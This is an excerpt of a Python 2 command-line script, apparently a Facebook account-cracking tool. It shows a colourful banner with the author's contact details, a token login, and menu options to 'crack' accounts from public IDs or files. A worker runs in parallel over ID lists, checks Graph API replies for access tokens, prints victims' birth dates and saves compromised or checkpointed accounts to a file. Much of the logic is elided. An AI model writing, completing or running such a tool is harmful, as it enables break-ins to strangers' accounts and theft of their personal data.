...
\x1b[1;97m--------------------------------------------------------------
\x1b[1;94m➣  AUTHOR  : DON'T TRY TO COPY MY SCRIPT PEEPS 😆
\x1b[1;94m➣  Facebook : Mohsin Ali
\x1b[1;94m➣  Note     : COMMANDS MAKER MOHSIN ALI SYCO
\x1b[1;94m➣  Github   : https://github.com/MohsinTheLegend
\x1b[1;94m➣  Whatsapp : +923063112***
...
def pilih_masuk():
	msuk = raw_input("\033[1;93mBY Mohsin \033[91m:\033[1;96m ")
	if msuk =="":
...
def login():
	...
	try:
		...
		os.system('clear')
		print logo
		print"\033[1;97m[\033[1;96m🤡\033[1;97m] LOGIN With FACEBOOK Mohsin \033[1;97m[\033[1;96m🤡\033[1;97m]"
...
def menu():
	...
	print "\033[1;31;1m=========================================="
	print "\033[37;1m=========================================="
	print "\033[1;97m[\033[1;34m✓\033[1;97m]\033[1;34m ID NAME\033[1;91m     =>\033[1;93m "+nama
...
def indo():
	...
	print "\033[37;96m║\033[1;34m[02]\033[1;31;1m->\033[37;1mCrack WITH PUBLIC ID    \033[37;96m║"
	print "\033[37;96m║\033[1;34m[03]\033[1;31;1m->\033[37;1mCrack WITH File         \033[37;96m║"
	print "\033[37;96m║\033[1;34m[00]\033[1;31;1m->\033[37;1mBack MOHSIN ALI                 \033[37;96m║"
	print "\033[37;96m╚══════════════════════════════╝"
	pilih_indo()

#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;93mBY MOHSIN ALI \033[91m:\033[1;96m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
		...
		print "\033[1;31;1m=========================================="
		print "\033[37;1m=========================================="
	        idt = raw_input("\033[1;97m{\033[1;34m✔\033[1;97m} ENTER PUBLIC ID : ")
		try:
	...
	print "\n\033[1;31;1m=========================================="
        print "\n\033[1;96mIF U THINK YOU ARE BAD NO YOU ARE WRONG M YOUR DAD"
...
##### MAIN INDONESIA #####
	def main(arg):
		...
		try:
			...
			if 'access_token' in w:
				...
				print '\x1c\33[1;33m[➹] \x1c\33[1;33mDate birth \x1c\33[1;33m: \x1c\33[1;33m' + c['birthday']
				...
				if 'www.facebook.com' in w['error_msg']:
					...
					if 'access_token' in w:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
						z = json.loads(x.text)
						print '\x1c\033[1;94m[✔] \x1c\033[1;92mOK'
	...
	p.map(main, id)
	print "\033[1;34m████████████████████████████████████████████████"
	print '\033[1;97m[\033[1;93m✔\033[1;97m] \033[1;97mD0N3 ....'
	...
	print '\033[1;97m[\033[1;93m➹\033[1;97m] \033[1;97mCP file complated : out/ind1.txt'
	print "\033[1;34m████████████████████████████████████████████████"
